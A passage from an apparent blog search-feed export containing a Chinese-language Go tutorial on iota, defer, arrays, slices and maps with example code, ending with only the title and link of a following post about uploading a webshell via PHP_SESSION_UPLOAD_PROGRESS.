class="string">"e = "</span>, e, <span class="string">"f = "</span>, f)</span><br><span class="line"></span><br><span class="line">fmt.Println(<span class="string">"g = "</span>, g, <span class="string">"h = "</span>, h)</span><br><span class="line">fmt.Println(<span class="string">"i = "</span>, i, <span class="string">"k = "</span>, k)</span><br><span class="line"></span><br><span class="line"><span class="comment">// iota 只能够配合const() 一起使用， iota只有在const进行累加效果。</span></span><br><span class="line"><span class="comment">//var a int = iota </span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x015-defer"><a href="#0x015-defer" class="headerlink" title="0x015 defer"></a>0x015 defer</h2><p>这个东西类似于python装饰器+finally ，在函数执行完执行</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">//写入defer关键字</span></span><br><span class="line"><span class="keyword">defer</span> fmt.Println(<span class="string">"main end1"</span>)</span><br><span class="line"><span class="keyword">defer</span> fmt.Println(<span class="string">"main end2"</span>)</span><br><span class="line">fmt.Println(<span class="string">"main::hello go 1"</span>)</span><br><span class="line">fmt.Println(<span class="string">"main::hello go 2"</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//main::hello go 1</span></span><br><span class="line"><span class="comment">//main::hello go 2</span></span><br><span class="line"><span class="comment">//main end2</span></span><br><span class="line"><span class="comment">//main end1</span></span><br></pre></td></tr></table></figure><h2 id="0x016-数组和循环遍历"><a href="#0x016-数组和循环遍历" class="headerlink" title="0x016 数组和循环遍历"></a>0x016 数组和循环遍历</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">printArray</span><span class="params">(myArray [4]<span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line"><span class="comment">//值拷贝</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> index, value := <span class="keyword">range</span> myArray &#123;</span><br><span class="line">fmt.Println(<span class="string">"index = "</span>, index, <span class="string">", value = "</span>, value)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">myArray[<span class="number">0</span>] = <span class="number">111</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">//固定长度的数组</span></span><br><span class="line"><span class="keyword">var</span> myArray1 [<span class="number">10</span>]<span class="keyword">int</span></span><br><span class="line"></span><br><span class="line">myArray2 := [<span class="number">10</span>]<span class="keyword">int</span>&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;</span><br><span class="line">myArray3 := [<span class="number">4</span>]<span class="keyword">int</span>&#123;<span class="number">11</span>,<span class="number">22</span>,<span class="number">33</span>,<span class="number">44</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//for i := 0; i &lt; 10; i++ 类似于C语言的常规遍历</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(myArray1); i++ &#123;</span><br><span class="line">fmt.Println(myArray1[i])</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//使用range 遍历数组切片，返回值为 数组下标和值</span></span><br><span class="line"><span class="keyword">for</span> index, value := <span class="keyword">range</span> myArray2 &#123;</span><br><span class="line">fmt.Println(<span class="string">"index = "</span>, index, <span class="string">", value = "</span>, value)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//查看数组的数据类型</span></span><br><span class="line">fmt.Printf(<span class="string">"myArray1 types = %T\n"</span>, myArray1)</span><br><span class="line">fmt.Printf(<span class="string">"myArray2 types = %T\n"</span>, myArray2)</span><br><span class="line">fmt.Printf(<span class="string">"myArray3 types = %T\n"</span>, myArray3)</span><br><span class="line"></span><br><span class="line">printArray(myArray3)</span><br><span class="line"><span class="keyword">for</span> index, value := <span class="keyword">range</span> myArray3 &#123;</span><br><span class="line">fmt.Println(<span class="string">"index = "</span>, index, <span class="string">", value = "</span>, value)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x2-silce切片"><a href="#0x2-silce切片" class="headerlink" title="0x2 silce切片"></a>0x2 silce切片</h2><h3 id="silce赋值"><a href="#silce赋值" class="headerlink" title="silce赋值"></a>silce赋值</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">printArray</span><span class="params">(myArray [4]<span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line"><span class="comment">//值拷贝</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> index, value := <span class="keyword">range</span> myArray &#123;</span><br><span class="line">fmt.Println(<span class="string">"index = "</span>, index, <span class="string">", value = "</span>, value)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">myArray[<span class="number">0</span>] = <span class="number">111</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">//固定长度的数组</span></span><br><span class="line"><span class="keyword">var</span> myArray1 [<span class="number">10</span>]<span class="keyword">int</span></span><br><span class="line"></span><br><span class="line">myArray2 := [<span class="number">10</span>]<span class="keyword">int</span>&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;</span><br><span class="line">myArray3 := [<span class="number">4</span>]<span class="keyword">int</span>&#123;<span class="number">11</span>,<span class="number">22</span>,<span class="number">33</span>,<span class="number">44</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//for i := 0; i &lt; 10; i++ &#123;</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(myArray1); i++ &#123;</span><br><span class="line">fmt.Println(myArray1[i])</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> index, value := <span class="keyword">range</span> myArray2 &#123;</span><br><span class="line">fmt.Println(<span class="string">"index = "</span>, index, <span class="string">", value = "</span>, value)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//查看数组的数据类型</span></span><br><span class="line">fmt.Printf(<span class="string">"myArray1 types = %T\n"</span>, myArray1)</span><br><span class="line">fmt.Printf(<span class="string">"myArray2 types = %T\n"</span>, myArray2)</span><br><span class="line">fmt.Printf(<span class="string">"myArray3 types = %T\n"</span>, myArray3)</span><br><span class="line"></span><br><span class="line">printArray(myArray3)</span><br><span class="line">fmt.Println(<span class="string">" ------ "</span>)</span><br><span class="line"><span class="keyword">for</span> index, value := <span class="keyword">range</span> myArray3 &#123;</span><br><span class="line">fmt.Println(<span class="string">"index = "</span>, index, <span class="string">", value = "</span>, value)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="动态数组slice"><a href="#动态数组slice" class="headerlink" title="动态数组slice"></a>动态数组slice</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">printArray2</span><span class="params">(myArray []<span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line"><span class="comment">//引用传递</span></span><br><span class="line"><span class="comment">// _ 表示匿名的变量</span></span><br><span class="line"><span class="keyword">for</span> _, value := <span class="keyword">range</span> myArray &#123;</span><br><span class="line">fmt.Println(<span class="string">"value = "</span>, value)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">myArray[<span class="number">0</span>] = <span class="number">100</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">myArray := []<span class="keyword">int</span>&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125; <span class="comment">// 动态数组，切片 slice</span></span><br><span class="line"></span><br><span class="line">fmt.Printf(<span class="string">"myArray type is %T\n"</span>, myArray)</span><br><span class="line"></span><br><span class="line">printArray2(myArray)</span><br><span class="line"></span><br><span class="line">fmt.Println(<span class="string">" ==== "</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, value := <span class="keyword">range</span> myArray &#123;</span><br><span class="line">fmt.Println(<span class="string">"value = "</span>, value)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="silce几种声明方式"><a href="#silce几种声明方式" class="headerlink" title="silce几种声明方式"></a>silce几种声明方式</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">//声明slice1是一个切片，并且初始化，默认值是1，2，3。 长度len是3</span></span><br><span class="line">slice1 := []<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//声明slice2是一个切片，但是并没有给slice分配空间</span></span><br><span class="line"><span class="keyword">var</span> slice2 []<span class="keyword">int</span></span><br><span class="line">fmt.Printf(<span class="string">"slice2: %v\n"</span>,slice2)</span><br><span class="line"><span class="comment">//slice1 = make([]int, 3) //开辟3个空间 ，默认值是0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//声明slice1是一个切片，同时给slice分配空间，3个空间，初始化值是0</span></span><br><span class="line"><span class="comment">//var slice1 []int = make([]int, 3)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//声明slice1是一个切片，同时给slice分配空间，3个空间，初始化值是0, 通过:=推导出slice是一个切片</span></span><br><span class="line"><span class="comment">// 常见</span></span><br><span class="line">slice3 := <span class="built_in">make</span>([]<span class="keyword">int</span>, <span class="number">3</span>)</span><br><span class="line">fmt.Printf(<span class="string">"slice3: %v\n"</span>,slice3)</span><br><span class="line"></span><br><span class="line">fmt.Printf(<span class="string">"len = %d, slice = %v\n"</span>, <span class="built_in">len</span>(slice1), slice1)</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断一个silce是否为0</span></span><br><span class="line"><span class="keyword">if</span> slice2 == <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">"slice2 是一个空切片"</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">"slice2 是有空间的"</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>这里面长度和空间的概念是不一个:</strong></p><ul><li>空间是这个slice的具体占用空间个数</li><li>长度len 是已经存放占有的空间个数</li></ul><h3 id="slice的追加"><a href="#slice的追加" class="headerlink" title="slice的追加"></a>slice的追加</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> numbers = <span class="built_in">make</span>([]<span class="keyword">int</span>, <span class="number">3</span>, <span class="number">5</span>)</span><br><span class="line"><span class="comment">// 长度为3 容量为5 [0,0,0,空,空]</span></span><br><span class="line"></span><br><span class="line">fmt.Printf(<span class="string">"len = %d, cap = %d, slice = %v\n"</span>, <span class="built_in">len</span>(numbers), <span class="built_in">cap</span>(numbers), numbers)</span><br><span class="line"></span><br><span class="line"><span class="comment">//向numbers切片追加一个元素1, numbers len = 4， [0,0,0,1], cap = 5</span></span><br><span class="line">numbers = <span class="built_in">append</span>(numbers, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">fmt.Printf(<span class="string">"len = %d, cap = %d, slice = %v\n"</span>, <span class="built_in">len</span>(numbers), <span class="built_in">cap</span>(numbers), numbers)</span><br><span class="line"></span><br><span class="line"><span class="comment">//向numbers切片追加一个元素2, numbers len = 5， [0,0,0,1,2], cap = 5</span></span><br><span class="line">numbers = <span class="built_in">append</span>(numbers, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">fmt.Printf(<span class="string">"len = %d, cap = %d, slice = %v\n"</span>, <span class="built_in">len</span>(numbers), <span class="built_in">cap</span>(numbers), numbers)</span><br><span class="line"></span><br><span class="line"><span class="comment">//向一个容量cap已经满的slice 追加元素，追加的数量为之前申请的5个，[0,0,0,1,2,2,0,0,0,0]</span></span><br><span class="line">numbers = <span class="built_in">append</span>(numbers, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">fmt.Printf(<span class="string">"len = %d, cap = %d, slice = %v\n"</span>, <span class="built_in">len</span>(numbers), <span class="built_in">cap</span>(numbers), numbers)</span><br><span class="line"><span class="comment">// len = 6, cap = 10, slice = [0 0 0 1 2 3]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 不指定长度的slice</span></span><br><span class="line"><span class="keyword">var</span> numbers2 = <span class="built_in">make</span>([]<span class="keyword">int</span>, <span class="number">3</span>)</span><br><span class="line">fmt.Printf(<span class="string">"len = %d, cap = %d, slice = %v\n"</span>, <span class="built_in">len</span>(numbers2), <span class="built_in">cap</span>(numbers2), numbers2)</span><br><span class="line"><span class="comment">// len = 3, cap = 3, slice = [0 0 0]</span></span><br><span class="line"></span><br><span class="line">numbers2 = <span class="built_in">append</span>(numbers2, <span class="number">1</span>)</span><br><span class="line">fmt.Printf(<span class="string">"len = %d, cap = %d, slice = %v\n"</span>, <span class="built_in">len</span>(numbers2), <span class="built_in">cap</span>(numbers2), numbers2)</span><br><span class="line"><span class="comment">// len = 4, cap = 6, slice = [0 0 0 1]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="slice的截取"><a href="#slice的截取" class="headerlink" title="slice的截取"></a>slice的截取</h3><p>和python的截取一样</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">s := []<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125; <span class="comment">//len = 3, cap = 3, [1,2,3]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//[0, 2)</span></span><br><span class="line">s1 := s[<span class="number">0</span>:<span class="number">2</span>] <span class="comment">// [1, 2]</span></span><br><span class="line"></span><br><span class="line">fmt.Println(s1)</span><br><span class="line"></span><br><span class="line">s1[<span class="number">0</span>] = <span class="number">100</span></span><br><span class="line"></span><br><span class="line">fmt.Println(s)</span><br><span class="line">fmt.Println(s1)</span><br><span class="line"></span><br><span class="line"><span class="comment">//copy 可以将底层数组的slice一起进行拷贝</span></span><br><span class="line">s2 := <span class="built_in">make</span>([]<span class="keyword">int</span>, <span class="number">3</span>) <span class="comment">//s2 = [0,0,0]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//将s中的值 依次拷贝到s2中</span></span><br><span class="line"><span class="built_in">copy</span>(s2, s)</span><br><span class="line">fmt.Println(s2)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>切片语法：</p><table><thead><tr><th><strong>操作</strong></th><th><strong>含义</strong></th></tr></thead><tbody><tr><td><strong>s[n]</strong></td><td>切片s中索引位置为n的项</td></tr><tr><td><strong>s[:]</strong></td><td>从切片s的索引位置0到len(s)-1处所获得的切片</td></tr><tr><td><strong>s[low:]</strong></td><td>从切片s的索引位置low到len(s)-1处所获得的切片</td></tr><tr><td><strong>s[:high]</strong></td><td>从切片s的索引位置0到high处所获得的切片，len=high</td></tr><tr><td><strong>s[low:high]</strong></td><td>从切片s的索引位置low到high处所获得的切片，len=high-low</td></tr><tr><td><strong>s[low:high:max]</strong></td><td>从切片s的索引位置low到high处所获得的切片，len=high-low，cap=max-low</td></tr><tr><td><strong>len(s)</strong></td><td>切片s的长度，总是&lt;=cap(s)</td></tr><tr><td><strong>cap(s)</strong></td><td>切片s的容量，总是&gt;=len(s)</td></tr></tbody></table><h2 id="0x03-map"><a href="#0x03-map" class="headerlink" title="0x03 map"></a>0x03 map</h2><h3 id="map定义"><a href="#map定义" class="headerlink" title="map定义"></a>map定义</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">//===&gt; 第一种声明方式</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//声明myMap1是一种map类型 key是string， value是string</span></span><br><span class="line"><span class="keyword">var</span> myMap1 <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span></span><br><span class="line"><span class="keyword">if</span> myMap1 == <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">"myMap1 是一个空map"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//在使用map前， 需要先用make给map分配数据空间</span></span><br><span class="line">myMap1 = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span>, <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">myMap1[<span class="string">"one"</span>] = <span class="string">"java"</span></span><br><span class="line">myMap1[<span class="string">"two"</span>] = <span class="string">"c++"</span></span><br><span class="line">myMap1[<span class="string">"three"</span>] = <span class="string">"python"</span></span><br><span class="line"></span><br><span class="line">fmt.Println(myMap1)</span><br><span class="line"></span><br><span class="line"><span class="comment">//===&gt; 第二种声明方式，自动分配空间</span></span><br><span class="line">myMap2 := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">string</span>)</span><br><span class="line">myMap2[<span class="number">1</span>] = <span class="string">"java"</span></span><br><span class="line">myMap2[<span class="number">2</span>] = <span class="string">"c++"</span></span><br><span class="line">myMap2[<span class="number">3</span>] = <span class="string">"python"</span></span><br><span class="line"></span><br><span class="line">fmt.Println(myMap2)</span><br><span class="line"></span><br><span class="line"><span class="comment">//===&gt; 第三种声明方式</span></span><br><span class="line">myMap3 := <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span>&#123;</span><br><span class="line"><span class="string">"one"</span>:   <span class="string">"php"</span>,</span><br><span class="line"><span class="string">"two"</span>:   <span class="string">"c++"</span>,</span><br><span class="line"><span class="string">"three"</span>: <span class="string">"python"</span>,</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(myMap3)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="map的使用"><a href="#map的使用" class="headerlink" title="map的使用"></a>map的使用</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">printMap</span><span class="params">(tmpMap <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line"><span class="comment">//cityMap 是一个引用传递</span></span><br><span class="line"><span class="keyword">for</span> key, value := <span class="keyword">range</span> tmpMap &#123;</span><br><span class="line">fmt.Println(<span class="string">"key = "</span>, key)</span><br><span class="line">fmt.Println(<span class="string">"value = "</span>, value)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ChangeValue</span><span class="params">(cityMap <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">cityMap[<span class="string">"England"</span>] = <span class="string">"London"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">cityMap := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加</span></span><br><span class="line">cityMap[<span class="string">"China"</span>] = <span class="string">"Beijing"</span></span><br><span class="line">cityMap[<span class="string">"Japan"</span>] = <span class="string">"Tokyo"</span></span><br><span class="line">cityMap[<span class="string">"USA"</span>] = <span class="string">"NewYork"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历</span></span><br><span class="line">printMap(cityMap)</span><br><span class="line"></span><br><span class="line"><span class="comment">//删除</span></span><br><span class="line"><span class="built_in">delete</span>(cityMap, <span class="string">"China"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//修改</span></span><br><span class="line">cityMap[<span class="string">"USA"</span>] = <span class="string">"DC"</span></span><br><span class="line">ChangeValue(cityMap)</span><br><span class="line"></span><br><span class="line">fmt.Println(<span class="string">"-------"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历</span></span><br><span class="line">printMap(cityMap)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 安全开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用PHP_SESSION_UPLOAD_PROGRESS上传webshell</title>
      <link href="/2021/09/24/%E5%88%A9%E7%94%A8PHP_SESSION_UPLOAD_PROGRESS%E4%B8%8A%E4%BC%A0webshell/"/>
      <url>/2021/09/24/%E5%88%A9%E7%94%A8PHP_SESSION_UPLOAD_PROGRESS%E4%B8%8A%E4%BC%A0webshell/</url>
      
